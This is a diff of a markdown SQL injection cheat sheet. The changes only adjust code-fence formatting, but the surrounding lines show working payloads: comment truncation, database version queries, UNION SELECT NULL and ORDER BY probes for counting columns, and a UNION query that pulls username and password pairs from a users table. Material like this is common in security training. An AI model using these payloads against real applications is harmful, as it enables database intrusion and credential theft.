@@ -6,7 +6,7 @@ This SQLi cheat sheet contains examples of useful syntax that you can use to per
 
 You can use comments to truncate a query and remove the portion of the original query that follows your input
 
-"""SQL
+"""
 **Oracle**: --comment
 
 **Microsoft**: --comment
@@ -30,7 +30,7 @@ You can use comments to truncate a query and remove the portion of the original 
 
 ## Database version
 
-"""SQL
+"""
 **Oracle**: SELECT banner FROM v$version
             SELECT version FROM v$instance
 
@@ -44,7 +44,7 @@ You can use comments to truncate a query and remove the portion of the original 
 ## Number of columns and type of each columns:
 
 If the number of nulls does not match the number of columns, the databas return an error.
-"""SQL
+"""
 	UNION SELECT NULL-- (FROM DUAL-- should follow NULL for the injected queries on Oracle )
 	UNION SELECT NULL,NULL--
 	UNION SELECT NULL,NULL,NULL--
@@ -53,14 +53,14 @@ If the number of nulls does not match the number of columns, the databas return 
 OR
 
 This method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs
-"""SQL
+"""
 	ORDER BY 1--
 	ORDER BY 2--
 	ORDER BY 3--
 """
 
 After getting the number of comlumns. We can replace`NULL` by `string` or `int` value (i.e: 'abc', 123) to detect the type of data in each column:
-"""SQL
+"""
 	UNION SELECT 'abc',NULL,NULL,NULL--
 	UNION SELECT NULL,'abc',NULL,NULL--
 	UNION SELECT NULL,NULL,123,NULL-
@@ -78,8 +78,9 @@ After getting the number of comlumns. We can replace`NULL` by `string` or `int` 
 **MySQL**: 'foo' 'bar' (the space needs to between the two strings)
            CONCAT('foo','bar')
 """
+
 For example:
-"""SQL
+"""
 UNION SELECT username || '~' || password FROM users--
 
 ==> results:
@@ -90,3 +91,5 @@ user2~password2
 user3~password3
 ...  
 """
+
+
